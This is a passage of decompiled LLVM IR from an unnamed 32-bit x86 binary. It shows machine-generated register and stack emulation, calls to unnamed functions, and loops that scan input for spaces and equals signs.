  store i32 %v1_8049138, i32* %v3_804913f, align 4
  %v4_8049140 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049145 = load i32, i32* @esp, align 4
  %v1_8049148 = add i32 %v4_8049140, 1
  %v8_8049148 = icmp eq i32 %v1_8049148, 0
  store i1 %v8_8049148, i1* %zf.global-to-local, align 1
  store i32 %v1_8049148, i32* %eax.global-to-local, align 4
  br i1 %v8_8049148, label %dec_label_pc_8049a67, label %dec_label_pc_804914f

dec_label_pc_804914f:                             ; preds = %dec_label_pc_8049124
  %v2_804914f = add i32 %v0_8049145, 12
  %v3_804914f = inttoptr i32 %v2_804914f to i32*
  store i32 %v1_8049148, i32* %v3_804914f, align 4
  %v0_8049150 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049150 = add i32 %v0_8049145, 8
  %v3_8049150 = inttoptr i32 %v2_8049150 to i32*
  store i32 %v0_8049150, i32* %v3_8049150, align 4
  %v1_8049151 = add i32 %v0_8049145, 4
  %v2_8049151 = inttoptr i32 %v1_8049151 to i32*
  store i32 0, i32* %v2_8049151, align 4
  %v2_8049153 = inttoptr i32 %v0_8049145 to i32*
  store i32 40, i32* %v2_8049153, align 4
  %v3_8049155 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049155, i32* %eax.global-to-local, align 4
  %v0_804915a = load i32, i32* @esp, align 4
  %v9_804915a = icmp eq i32 %v0_804915a, -12
  store i1 %v9_804915a, i1* %zf.global-to-local, align 1
  %v2_804915d = add i32 %v0_804915a, 8
  %v3_804915d = inttoptr i32 %v2_804915d to i32*
  store i32 %v3_8049155, i32* %v3_804915d, align 4
  %v1_804915e = add i32 %v0_804915a, 120
  %v2_804915e = inttoptr i32 %v1_804915e to i32*
  %v3_804915e = load i32, i32* %v2_804915e, align 4
  store i32 %v3_804915e, i32* %eax.global-to-local, align 4
  %v2_8049162 = add i32 %v0_804915a, 4
  %v3_8049162 = inttoptr i32 %v2_8049162 to i32*
  store i32 %v3_804915e, i32* %v3_8049162, align 4
  %v1_8049163 = add i32 %v0_804915a, 147
  store i32 %v1_8049163, i32* @edx, align 4
  %v3_804916a = inttoptr i32 %v0_804915a to i32*
  store i32 %v1_8049163, i32* %v3_804916a, align 4
  %v4_804916b = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804916b, i32* %eax.global-to-local, align 4
  %v0_8049170 = load i32, i32* @esp, align 4
  %v6_8049170 = icmp eq i32 %v0_8049170, -16
  store i1 %v6_8049170, i1* %zf.global-to-local, align 1
  store i32 %v4_804916b, i32* %ebx.global-to-local, align 4
  %v2_8049175 = add i32 %v4_804916b, 147
  %v3_8049175 = add i32 %v2_8049175, %v0_8049170
  %v4_8049175 = inttoptr i32 %v3_8049175 to i8*
  %v5_8049175 = load i8, i8* %v4_8049175, align 1
  %v11_8049175 = icmp eq i8 %v5_8049175, 32
  %v1_804917d = zext i1 %v11_8049175 to i32
  %v1_8049180 = add i32 %v0_8049170, 147
  store i32 %v1_8049180, i32* %esi.global-to-local, align 4
  store i32 %v1_804917d, i32* %eax.global-to-local, align 4
  %v1_804918c = add i32 %v0_8049170, 12
  %v2_804918c = inttoptr i32 %v1_804918c to i32*
  store i32 2, i32* %v2_804918c, align 4
  %v1_804918e = add i32 %v0_8049170, 8
  %v2_804918e = inttoptr i32 %v1_804918e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_804918e, align 4
  %v0_8049193 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049193 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049193 = add i32 %v1_8049193, %v0_8049193
  store i32 %v2_8049193, i32* @ebx, align 4
  %v1_8049195 = add i32 %v0_8049170, 120
  %v2_8049195 = inttoptr i32 %v1_8049195 to i32*
  %v3_8049195 = load i32, i32* %v2_8049195, align 4
  %v2_8049199 = sub i32 %v3_8049195, %v2_8049193
  store i32 %v2_8049199, i32* %eax.global-to-local, align 4
  %v0_804919b = load i32, i32* %esi.global-to-local, align 4
  %v2_804919b = add i32 %v0_804919b, %v2_8049193
  %v12_804919b = icmp eq i32 %v2_804919b, 0
  store i1 %v12_804919b, i1* %zf.global-to-local, align 1
  store i32 %v2_804919b, i32* @esi, align 4
  %v2_804919d = add i32 %v0_8049170, 4
  %v3_804919d = inttoptr i32 %v2_804919d to i32*
  store i32 %v2_8049199, i32* %v3_804919d, align 4
  %v0_804919e = load i32, i32* @esi, align 4
  %v3_804919e = inttoptr i32 %v0_8049170 to i32*
  store i32 %v0_804919e, i32* %v3_804919e, align 4
  %v0_804919f = call i32 @function_8051590()
  store i32 %v0_804919f, i32* %eax.global-to-local, align 4
  %v0_80491a4 = load i32, i32* @esp, align 4
  store i32 %v0_804919f, i32* %edx.global-to-local, align 4
  %v10_80491a9 = icmp eq i32 %v0_804919f, -1
  store i1 %v10_80491a9, i1* %zf.global-to-local, align 1
  br i1 %v10_80491a9, label %dec_label_pc_80491db, label %dec_label_pc_80491ae

dec_label_pc_80491ae:                             ; preds = %dec_label_pc_804914f
  %v10_80491ae = icmp eq i32 %v0_804919f, 1
  store i1 %v10_80491ae, i1* %zf.global-to-local, align 1
  %v7_80491b1 = icmp sgt i32 %v0_804919f, 1
  br i1 %v7_80491b1, label %dec_label_pc_80491b3, label %dec_label_pc_80491b6

dec_label_pc_80491b3:                             ; preds = %dec_label_pc_80491ae
  %v1_80491b3 = add i32 %v0_804919f, -2
  %v9_80491b3 = icmp eq i32 %v1_80491b3, 0
  store i1 %v9_80491b3, i1* %zf.global-to-local, align 1
  store i32 %v1_80491b3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80491b6

dec_label_pc_80491b6:                             ; preds = %dec_label_pc_80491ae, %dec_label_pc_80491b3
  %v1_80491bf = phi i32 [ %v0_804919f, %dec_label_pc_80491ae ], [ %v1_80491b3, %dec_label_pc_80491b3 ]
  %v1_80491b6 = add i32 %v0_80491a4, 20920
  %v1_80491bd = load i32, i32* @ebx, align 4
  %v2_80491bd = add i32 %v1_80491b6, %v1_80491bd
  %v12_80491bd = icmp eq i32 %v2_80491bd, 0
  store i1 %v12_80491bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80491bd, i32* %eax.global-to-local, align 4
  %v2_80491bf = add i32 %v1_80491bf, -20773
  %v3_80491bf = add i32 %v2_80491bf, %v2_80491bd
  %v4_80491bf = inttoptr i32 %v3_80491bf to i8*
  store i8 0, i8* %v4_80491bf, align 1
  %v0_80491c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80491c7 = load i32, i32* @esp, align 4
  %v2_80491c7 = add i32 %v1_80491c7, -4
  %v3_80491c7 = inttoptr i32 %v2_80491c7 to i32*
  store i32 %v0_80491c7, i32* %v3_80491c7, align 4
  %v0_80491c8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491c8 = add i32 %v1_80491c7, -8
  %v3_80491c8 = inttoptr i32 %v2_80491c8 to i32*
  store i32 %v0_80491c8, i32* %v3_80491c8, align 4
  %v1_80491c9 = add i32 %v1_80491c7, -12
  %v2_80491c9 = inttoptr i32 %v1_80491c9 to i32*
  store i32 10, i32* %v2_80491c9, align 4
  %v0_80491cb = load i32, i32* @esi, align 4
  %v2_80491cb = add i32 %v1_80491c7, -16
  %v3_80491cb = inttoptr i32 %v2_80491cb to i32*
  store i32 %v0_80491cb, i32* %v3_80491cb, align 4
  %v3_80491cc = call i32 @function_80515e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80491cc, i32* %eax.global-to-local, align 4
  %v0_80491d1 = load i32, i32* @esp, align 4
  %v1_80491d1 = add i32 %v0_80491d1, 108
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  store i32 %v3_80491d1, i32* %ecx.global-to-local, align 4
  %v6_80491d5 = icmp eq i32 %v0_80491d1, -16
  store i1 %v6_80491d5, i1* %zf.global-to-local, align 1
  %v2_80491d8 = add i32 %v3_80491d1, 12
  %v3_80491d8 = inttoptr i32 %v2_80491d8 to i32*
  store i32 %v3_80491cc, i32* %v3_80491d8, align 4
  br label %dec_label_pc_80491db

dec_label_pc_80491db:                             ; preds = %dec_label_pc_804914f, %dec_label_pc_8049a67, %dec_label_pc_80491b6
  store i1 true, i1* %zf.global-to-local, align 1
  %v1_80491e0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_80491e0:                             ; preds = %dec_label_pc_8049301, %dec_label_pc_80491db
  %v1_80491e0 = phi i32 [ %v1_80491e0.pre, %dec_label_pc_80491db ], [ %v0_8049301, %dec_label_pc_8049301 ]
  %storemerge7 = phi i32 [ 0, %dec_label_pc_80491db ], [ %v3_8049301, %dec_label_pc_8049301 ]
  store i32 %storemerge7, i32* @esi, align 4
  %v0_80491e0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e0 = add i32 %v1_80491e0, -4
  %v3_80491e0 = inttoptr i32 %v2_80491e0 to i32*
  store i32 %v0_80491e0, i32* %v3_80491e0, align 4
  %v0_80491e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80491e1 = add i32 %v1_80491e0, -8
  %v3_80491e1 = inttoptr i32 %v2_80491e1 to i32*
  store i32 %v0_80491e1, i32* %v3_80491e1, align 4
  %v1_80491e2 = add i32 %v1_80491e0, -12
  %v2_80491e2 = inttoptr i32 %v1_80491e2 to i32*
  store i32 0, i32* %v2_80491e2, align 4
  %v1_80491e4 = add i32 %v1_80491e0, -16
  %v2_80491e4 = inttoptr i32 %v1_80491e4 to i32*
  store i32 39, i32* %v2_80491e4, align 4
  %v3_80491e6 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80491e6, i32* %eax.global-to-local, align 4
  %v0_80491eb = load i32, i32* @esp, align 4
  %v1_80491eb = add i32 %v0_80491eb, 147
  %v1_80491f5 = load i32, i32* @esi, align 4
  %v2_80491f5 = add i32 %v1_80491eb, %v1_80491f5
  %v12_80491f5 = icmp eq i32 %v2_80491f5, 0
  store i1 %v12_80491f5, i1* %zf.global-to-local, align 1
  store i32 %v2_80491f5, i32* @ebx, align 4
  %v2_80491f7 = add i32 %v0_80491eb, 8
  %v3_80491f7 = inttoptr i32 %v2_80491f7 to i32*
  store i32 %v3_80491e6, i32* %v3_80491f7, align 4
  %v1_80491f8 = add i32 %v0_80491eb, 120
  %v2_80491f8 = inttoptr i32 %v1_80491f8 to i32*
  %v3_80491f8 = load i32, i32* %v2_80491f8, align 4
  store i32 %v3_80491f8, i32* @ebp, align 4
  %v2_80491fc = add i32 %v0_80491eb, 4
  %v3_80491fc = inttoptr i32 %v2_80491fc to i32*
  store i32 %v3_80491f8, i32* %v3_80491fc, align 4
  %v0_80491fd = load i32, i32* @ebx, align 4
  %v3_80491fd = inttoptr i32 %v0_80491eb to i32*
  store i32 %v0_80491fd, i32* %v3_80491fd, align 4
  %v4_80491fe = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049203 = load i32, i32* @esp, align 4
  %v1_8049206 = add i32 %v4_80491fe, 1
  %v8_8049206 = icmp eq i32 %v1_8049206, 0
  store i1 %v8_8049206, i1* %zf.global-to-local, align 1
  store i32 %v1_8049206, i32* %eax.global-to-local, align 4
  br i1 %v8_8049206, label %dec_label_pc_80493d2, label %dec_label_pc_804920d

dec_label_pc_804920d:                             ; preds = %dec_label_pc_80491e0
  %v1_804920d = add i32 %v0_8049203, 108
  %v2_804920d = inttoptr i32 %v1_804920d to i32*
  %v3_804920d = load i32, i32* %v2_804920d, align 4
  store i32 %v3_804920d, i32* %edx.global-to-local, align 4
  %v1_8049211 = add i32 %v3_804920d, 16
  %v2_8049211 = inttoptr i32 %v1_8049211 to i32*
  %v3_8049211 = load i32, i32* %v2_8049211, align 4
  %v4_8049211 = add i32 %v3_8049211, -4
  %v9_8049211 = sub i32 3, %v3_8049211
  %v10_8049211 = and i32 %v9_8049211, %v3_8049211
  %v11_8049211 = icmp slt i32 %v10_8049211, 0
  %v12_8049211 = icmp eq i32 %v4_8049211, 0
  store i1 %v12_8049211, i1* %zf.global-to-local, align 1
  %v13_8049211 = icmp slt i32 %v4_8049211, 0
  %v3_8049215 = icmp eq i1 %v13_8049211, %v11_8049211
  %v4_8049215 = icmp eq i1 %v12_8049211, false
  %v5_8049215 = and i1 %v4_8049215, %v3_8049215
  br i1 %v5_8049215, label %dec_label_pc_80493d2, label %dec_label_pc_804921b

dec_label_pc_804921b:                             ; preds = %dec_label_pc_804920d
  %v2_804921b = add i32 %v0_8049203, 12
  %v3_804921b = inttoptr i32 %v2_804921b to i32*
  store i32 %v1_8049206, i32* %v3_804921b, align 4
  %v0_804921c = load i32, i32* %eax.global-to-local, align 4
  %v2_804921c = add i32 %v0_8049203, 8
  %v3_804921c = inttoptr i32 %v2_804921c to i32*
  store i32 %v0_804921c, i32* %v3_804921c, align 4
  %v1_804921d = add i32 %v0_8049203, 4
  %v2_804921d = inttoptr i32 %v1_804921d to i32*
  store i32 0, i32* %v2_804921d, align 4
  %v2_804921f = inttoptr i32 %v0_8049203 to i32*
  store i32 39, i32* %v2_804921f, align 4
  %v3_8049221 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049221, i32* %eax.global-to-local, align 4
  %v0_8049226 = load i32, i32* @esp, align 4
  %v9_8049226 = icmp eq i32 %v0_8049226, -12
  store i1 %v9_8049226, i1* %zf.global-to-local, align 1
  %v2_8049229 = add i32 %v0_8049226, 8
  %v3_8049229 = inttoptr i32 %v2_8049229 to i32*
  store i32 %v3_8049221, i32* %v3_8049229, align 4
  %v1_804922a = add i32 %v0_8049226, 120
  %v2_804922a = inttoptr i32 %v1_804922a to i32*
  %v3_804922a = load i32, i32* %v2_804922a, align 4
  store i32 %v3_804922a, i32* %eax.global-to-local, align 4
  %v2_804922e = add i32 %v0_8049226, 4
  %v3_804922e = inttoptr i32 %v2_804922e to i32*
  store i32 %v3_804922a, i32* %v3_804922e, align 4
  %v0_804922f = load i32, i32* @ebx, align 4
  %v3_804922f = inttoptr i32 %v0_8049226 to i32*
  store i32 %v0_804922f, i32* %v3_804922f, align 4
  %v4_8049230 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049230, i32* %eax.global-to-local, align 4
  %v0_8049235 = load i32, i32* @esi, align 4
  %v2_8049235 = add i32 %v0_8049235, %v4_8049230
  store i32 %v2_8049235, i32* %edx.global-to-local, align 4
  %v1_8049238 = load i32, i32* @esp, align 4
  %v2_8049238 = add i32 %v1_8049238, 124
  %v3_8049238 = inttoptr i32 %v2_8049238 to i32*
  store i32 %v2_8049235, i32* %v3_8049238, align 4
  %v0_804923c = load i32, i32* @esp, align 4
  %v1_804923c = add i32 %v0_804923c, 16
  %v6_804923c = icmp eq i32 %v1_804923c, 0
  store i1 %v6_804923c, i1* %zf.global-to-local, align 1
  %v1_804923f = load i32, i32* %edx.global-to-local, align 4
  %v2_804923f = add i32 %v0_804923c, 147
  %v3_804923f = add i32 %v2_804923f, %v1_804923f
  %v4_804923f = inttoptr i32 %v3_804923f to i8*
  %v5_804923f = load i8, i8* %v4_804923f, align 1
  %v11_804923f = icmp eq i8 %v5_804923f, 32
  store i1 %v11_804923f, i1* %zf.global-to-local, align 1
  br i1 %v11_804923f, label %dec_label_pc_804939a, label %dec_label_pc_804924d

dec_label_pc_804924d:                             ; preds = %dec_label_pc_804921b, %dec_label_pc_804939a
  %v0_8049256 = phi i32 [ %v1_804923c, %dec_label_pc_804921b ], [ %v0_804924d.pre, %dec_label_pc_804939a ]
  %v1_804924d = add i32 %v0_8049256, 104
  %v2_804924d = inttoptr i32 %v1_804924d to i32*
  %v3_804924d = load i32, i32* %v2_804924d, align 4
  %v0_8049251 = load i32, i32* @ebx, align 4
  %v1_8049251 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049251 = add i32 %v1_8049251, %v0_8049251
  store i32 %v2_8049251, i32* @ebp, align 4
  %v1_8049254 = load i32, i32* @esi, align 4
  %v2_8049254 = sub i32 %v3_804924d, %v1_8049254
  store i32 %v2_8049254, i32* %edi.global-to-local, align 4
  %v1_8049256 = add i32 %v0_8049256, -4
  %v2_8049256 = inttoptr i32 %v1_8049256 to i32*
  store i32 2, i32* %v2_8049256, align 4
  %v0_8049258 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049258 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049258 = sub i32 %v0_8049258, %v1_8049258
  %v12_8049258 = icmp eq i32 %v2_8049258, 0
  store i1 %v12_8049258, i1* %zf.global-to-local, align 1
  store i32 %v2_8049258, i32* @edi, align 4
  %v1_804925a = add i32 %v0_8049256, -8
  %v2_804925a = inttoptr i32 %v1_804925a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_804925a, align 4
  %v0_804925f = load i32, i32* @edi, align 4
  %v2_804925f = add i32 %v0_8049256, -12
  %v3_804925f = inttoptr i32 %v2_804925f to i32*
  store i32 %v0_804925f, i32* %v3_804925f, align 4
  %v0_8049260 = load i32, i32* @ebp, align 4
  %v2_8049260 = add i32 %v0_8049256, -16
  %v3_8049260 = inttoptr i32 %v2_8049260 to i32*
  store i32 %v0_8049260, i32* %v3_8049260, align 4
  %v0_8049261 = call i32 @function_8051590()
  store i32 %v0_8049261, i32* %eax.global-to-local, align 4
  %v0_8049266 = load i32, i32* @esp, align 4
  %v1_8049266 = add i32 %v0_8049266, 16
  store i32 %v0_8049261, i32* @ebx, align 4
  %v10_804926b = icmp eq i32 %v0_8049261, -1
  store i1 %v10_804926b, i1* %zf.global-to-local, align 1
  br i1 %v10_804926b, label %dec_label_pc_8049301, label %dec_label_pc_8049274

dec_label_pc_8049274:                             ; preds = %dec_label_pc_804924d
  %v1_8049274 = add i32 %v0_8049266, 147
  store i32 %v1_8049274, i32* %esi.global-to-local, align 4
  %v1_804927b = add i32 %v0_8049266, 124
  %v2_804927b = inttoptr i32 %v1_804927b to i32*
  %v3_804927b = load i32, i32* %v2_804927b, align 4
  store i32 %v3_804927b, i32* %eax.global-to-local, align 4
  %v2_804927f = add i32 %v3_804927b, %v1_8049274
  store i32 %v2_804927f, i32* @esi, align 4
  %v10_8049281 = icmp eq i32 %v0_8049261, 1
  store i1 %v10_8049281, i1* %zf.global-to-local, align 1
  %v7_8049284 = icmp sgt i32 %v0_8049261, 1
  br i1 %v7_8049284, label %dec_label_pc_8049286, label %dec_label_pc_8049289

dec_label_pc_8049286:                             ; preds = %dec_label_pc_8049274
  %v1_8049286 = add i32 %v0_8049261, -2
  %v9_8049286 = icmp eq i32 %v1_8049286, 0
  store i1 %v9_8049286, i1* %zf.global-to-local, align 1
  store i32 %v1_8049286, i32* @ebx, align 4
  br label %dec_label_pc_8049289

dec_label_pc_8049289:                             ; preds = %dec_label_pc_8049274, %dec_label_pc_8049286
  %v1_8049289 = add i32 %v0_8049266, 12
  %v2_8049289 = inttoptr i32 %v1_8049289 to i32*
  store i32 1, i32* %v2_8049289, align 4
  %v1_804928b = add i32 %v0_8049266, 8
  %v2_804928b = inttoptr i32 %v1_804928b to i32*
  store i32 ptrtoint (i32* @global_var_80543a9.14 to i32), i32* %v2_804928b, align 4
  %v0_8049290 = load i32, i32* @edi, align 4
  %v2_8049290 = add i32 %v0_8049266, 4
  %v3_8049290 = inttoptr i32 %v2_8049290 to i32*
  store i32 %v0_8049290, i32* %v3_8049290, align 4
  %v0_8049291 = load i32, i32* @ebp, align 4
  %v3_8049291 = inttoptr i32 %v0_8049266 to i32*
  store i32 %v0_8049291, i32* %v3_8049291, align 4
  %v0_8049292 = call i32 @function_8051590()
  store i32 %v0_8049292, i32* %eax.global-to-local, align 4
  %v0_8049297 = load i32, i32* @esp, align 4
  %v1_804929a = icmp eq i32 %v0_8049292, 0
  store i1 %v1_804929a, i1* %zf.global-to-local, align 1
  %tmp144 = icmp slt i32 %v0_8049292, 1
  br i1 %tmp144, label %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, label %dec_label_pc_804929e

dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge: ; preds = %dec_label_pc_8049289
  %v1_8049297 = add i32 %v0_8049297, 16
  %v1_80492bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_804929e:                             ; preds = %dec_label_pc_8049289
  %v1_804929e = add i32 %v0_8049297, 12
  %v2_804929e = inttoptr i32 %v1_804929e to i32*
  store i32 1, i32* %v2_804929e, align 4
  %v1_80492a0 = add i32 %v0_8049297, 8
  %v2_80492a0 = inttoptr i32 %v1_80492a0 to i32*
  store i32 ptrtoint (i32* @global_var_80543a9.14 to i32), i32* %v2_80492a0, align 4
  %v0_80492a5 = load i32, i32* @edi, align 4
  %v2_80492a5 = add i32 %v0_8049297, 4
  %v3_80492a5 = inttoptr i32 %v2_80492a5 to i32*
  store i32 %v0_80492a5, i32* %v3_80492a5, align 4
  %v0_80492a6 = load i32, i32* @ebp, align 4
  %v3_80492a6 = inttoptr i32 %v0_8049297 to i32*
  store i32 %v0_80492a6, i32* %v3_80492a6, align 4
  %v0_80492a7 = call i32 @function_8051590()
  store i32 %v0_80492a7, i32* %eax.global-to-local, align 4
  %v0_80492ac = load i32, i32* @esp, align 4
  %v1_80492ac = add i32 %v0_80492ac, 16
  %v6_80492ac = icmp eq i32 %v1_80492ac, 0
  store i1 %v6_80492ac, i1* %zf.global-to-local, align 1
  %v1_80492af = add i32 %v0_80492a7, -1
  store i32 %v1_80492af, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80492b2

dec_label_pc_80492b2:                             ; preds = %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge, %dec_label_pc_804929e
  %v1_80492bd = phi i32 [ %v1_80492bd.pre, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492af, %dec_label_pc_804929e ]
  %v0_80492bf = phi i32 [ %v1_8049297, %dec_label_pc_8049289.dec_label_pc_80492b2_crit_edge ], [ %v1_80492ac, %dec_label_pc_804929e ]
  %v1_80492b2 = add i32 %v0_80492bf, 20904
  store i32 %v1_80492b2, i32* %eax.global-to-local, align 4
  %v1_80492b9 = add i32 %v0_80492bf, 108
  %v2_80492b9 = inttoptr i32 %v1_80492b9 to i32*
  %v3_80492b9 = load i32, i32* %v2_80492b9, align 4
  store i32 %v3_80492b9, i32* %edx.global-to-local, align 4
  %v2_80492bd = add i32 %v1_80492b2, %v1_80492bd
  %v12_80492bd = icmp eq i32 %v2_80492bd, 0
  store i1 %v12_80492bd, i1* %zf.global-to-local, align 1
  store i32 %v2_80492bd, i32* %eax.global-to-local, align 4
  %v1_80492bf = add i32 %v0_80492bf, 20900
  %v2_80492bf = inttoptr i32 %v1_80492bf to i32*
  store i32 0, i32* %v2_80492bf, align 4
  %v0_80492ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80492ca = load i32, i32* %edx.global-to-local, align 4
  %v2_80492ca = add i32 %v0_80492ca, -20773
  %v3_80492ca = add i32 %v2_80492ca, %v1_80492ca
  %v4_80492ca = inttoptr i32 %v3_80492ca to i8*
  store i8 0, i8* %v4_80492ca, align 1
  br label %dec_label_pc_80492e4

dec_label_pc_80492d4:                             ; preds = %dec_label_pc_80492e4
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_80492da

dec_label_pc_80492da:                             ; preds = %dec_label_pc_80492d4
  %v1_80492da = add i32 %v3_80492ed, 1
  store i32 %v1_80492da, i32* %eax.global-to-local, align 4
  store i32 %v1_80492da, i32* %v2_80492ed, align 4
  br label %dec_label_pc_80492e4

dec_label_pc_80492e4:                             ; preds = %dec_label_pc_80492b2, %dec_label_pc_80492da
  %v0_80492e4 = load i32, i32* @esp, align 4
  %v9_80492e4 = icmp eq i32 %v0_80492e4, 12
  store i1 %v9_80492e4, i1* %zf.global-to-local, align 1
  %v0_80492e7 = load i32, i32* @esi, align 4
  %v2_80492e7 = add i32 %v0_80492e4, -16
  %v3_80492e7 = inttoptr i32 %v2_80492e7 to i32*
  store i32 %v0_80492e7, i32* %v3_80492e7, align 4
  %v2_80492e8 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_80492e8, i32* %eax.global-to-local, align 4
  %v0_80492ed = load i32, i32* @esp, align 4
  %v1_80492ed = add i32 %v0_80492ed, 20916
  %v2_80492ed = inttoptr i32 %v1_80492ed to i32*
  %v3_80492ed = load i32, i32* %v2_80492ed, align 4
  store i32 %v3_80492ed, i32* @ebx, align 4
  %v2_80492f7 = sub i32 %v2_80492e8, %v3_80492ed
  %v8_80492f7 = xor i32 %v3_80492ed, %v2_80492e8
  %v9_80492f7 = xor i32 %v2_80492f7, %v2_80492e8
  %v10_80492f7 = and i32 %v9_80492f7, %v8_80492f7
  %v11_80492f7 = icmp slt i32 %v10_80492f7, 0
  %v12_80492f7 = icmp eq i32 %v2_80492f7, 0
  store i1 %v12_80492f7, i1* %zf.global-to-local, align 1
  %v13_80492f7 = icmp slt i32 %v2_80492f7, 0
  %v3_80492f9 = icmp eq i1 %v13_80492f7, %v11_80492f7
  %v4_80492f9 = icmp eq i1 %v12_80492f7, false
  %v5_80492f9 = and i1 %v4_80492f9, %v3_80492f9
  %v0_80492d4 = load i32, i32* @esi, align 4
  %v2_80492d4 = add i32 %v0_80492d4, %v3_80492ed
  %v3_80492d4 = inttoptr i32 %v2_80492d4 to i8*
  %v4_80492d4 = load i8, i8* %v3_80492d4, align 1
  %v13_80492d4 = icmp eq i8 %v4_80492d4, 61
  store i1 %v13_80492d4, i1* %zf.global-to-local, align 1
  br i1 %v5_80492f9, label %dec_label_pc_80492d4, label %dec_label_pc_80492fb

dec_label_pc_80492fb:                             ; preds = %dec_label_pc_80492e4
  %v1_80492f4 = add i32 %v0_80492ed, 16
  br i1 %v13_80492d4, label %dec_label_pc_804930a, label %dec_label_pc_8049301

dec_label_pc_8049301:                             ; preds = %dec_label_pc_8049322, %dec_label_pc_80492fb, %dec_label_pc_804924d, %dec_label_pc_8049358, %dec_label_pc_8049369
  %v0_8049301 = phi i32 [ %v1_80492f4, %dec_label_pc_80492fb ], [ %v1_8049266, %dec_label_pc_804924d ], [ %v1_8049361, %dec_label_pc_8049358 ], [ %v0_8049301.pre, %dec_label_pc_8049369 ], [ %v1_8049339, %dec_label_pc_8049322 ]
  %v1_8049301 = add i32 %v0_8049301, 108
  %v2_8049301 = inttoptr i32 %v1_8049301 to i32*
  %v3_8049301 = load i32, i32* %v2_8049301, align 4
  br label %dec_label_pc_80491e0

dec_label_pc_804930a:                             ; preds = %dec_label_pc_80492d4, %dec_label_pc_80492fb
  %v1_804930a = add i32 %v0_80492ed, 108
  %v2_804930a = inttoptr i32 %v1_804930a to i32*
  %v3_804930a = load i32, i32* %v2_804930a, align 4
  store i32 %v3_804930a, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v2_80492ed, align 4
  %v0_8049319 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049319 = add i32 %v0_8049319, 16
  %v2_8049319 = inttoptr i32 %v1_8049319 to i32*
  %v3_8049319 = load i32, i32* %v2_8049319, align 4
  %v1_804931c = icmp eq i32 %v3_8049319, 0
  store i1 %v1_804931c, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_8049319, 1
  br i1 %tmp145, label %dec_label_pc_8049358, label %dec_label_pc_8049320

dec_label_pc_8049320:                             ; preds = %dec_label_pc_804930a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049322

dec_label_pc_8049322:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_8049320
  %v0_8049322 = phi i32 [ %v4_8049353, %dec_label_pc_8049340 ], [ 0, %dec_label_pc_8049320 ]
  %v2_8049322 = mul i32 %v0_8049322, 128
  %v3_8049322 = icmp eq i32 %v2_8049322, 0
  store i1 %v3_8049322, i1* %zf.global-to-local, align 1
  store i32 %v2_8049322, i32* %eax.global-to-local, align 4
  %v0_8049325 = load i32, i32* @edi, align 4
  %v1_8049325 = load i32, i32* @esp, align 4
  %v2_8049325 = add i32 %v1_8049325, -4
  %v3_8049325 = inttoptr i32 %v2_8049325 to i32*
  store i32 %v0_8049325, i32* %v3_8049325, align 4
  %v0_8049326 = load i32, i32* @ebx, align 4
  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
